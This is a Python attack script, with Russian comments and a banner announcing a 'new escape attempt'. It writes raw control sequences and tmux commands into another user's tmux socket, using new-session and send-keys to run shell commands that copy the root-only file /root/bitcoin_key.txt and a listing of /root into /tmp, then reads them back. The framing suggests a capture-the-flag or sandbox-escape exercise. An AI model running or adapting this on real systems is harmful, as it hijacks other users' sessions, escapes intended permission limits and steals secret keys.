#!/usr/bin/env python3
import socket
import time
import os


def try_tmux_control_mode():
    """Пробуем tmux control mode"""
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect('/tmp/tmux-100/default')

        # Инициализируем control mode
        sock.send(b'\x1b[?1049h')  # tmux escape sequence
        time.sleep(0.5)

        # Отправляем команду через tmux protocol
        command = 'new-session -d "cat /root/bitcoin_key.txt > /tmp/flag_output.txt; echo DONE > /tmp/status.txt"\n'
        sock.send(command.encode())
        time.sleep(2)
        sock.close()

        # Проверяем результат
        if os.path.exists('/tmp/flag_output.txt'):
            with open('/tmp/flag_output.txt', 'r') as f:
                return f.read().strip()
        elif os.path.exists('/tmp/status.txt'):
            return "Команда выполнена, но флаг не найден"
        return "Файлы не созданы"
    except Exception as e:
        return f"Ошибка control mode: {e}"


def try_direct_tmux_commands():
    """Пробуем прямые tmux команды"""
    commands = [
        b'list-sessions\n',
        b'new-session -d -s hack "cat /root/bitcoin_key.txt > /tmp/bitcoin_flag.txt"\n',
        b'send-keys -t hack "cat /root/bitcoin_key.txt > /tmp/direct_flag.txt" Enter\n',
        b'send-keys -t hack "ls -la /root/ > /tmp/root_ls.txt" Enter\n'
    ]

    results = []
    for i, cmd in enumerate(commands):
        try:
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.connect('/tmp/tmux-100/default')
            sock.send(cmd)
            time.sleep(1)
            sock.close()
            results.append(f"Команда {i + 1}: успешно")
        except Exception as e:
            results.append(f"Команда {i + 1}: ошибка {e}")

    return "; ".join(results)


# Выполняем оба метода
print("=== НОВАЯ ПОПЫТКА ЭСКЕЙПА ===")

result1 = try_tmux_control_mode()
print(f"Control mode: {result1}")

result2 = try_direct_tmux_commands()
print(f"Direct commands: {result2}")

# Проверяем все созданные файлы
time.sleep(3)
output_files = ['/tmp/flag_output.txt', '/tmp/bitcoin_flag.txt', '/tmp/direct_flag.txt', '/tmp/root_ls.txt']

print("\n=== ПРОВЕРКА ФАЙЛОВ ===")
for filepath in output_files:
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            content = f.read().strip()
            print(f"{filepath}: {content}")
    else:
        print(f"{filepath}: не существует")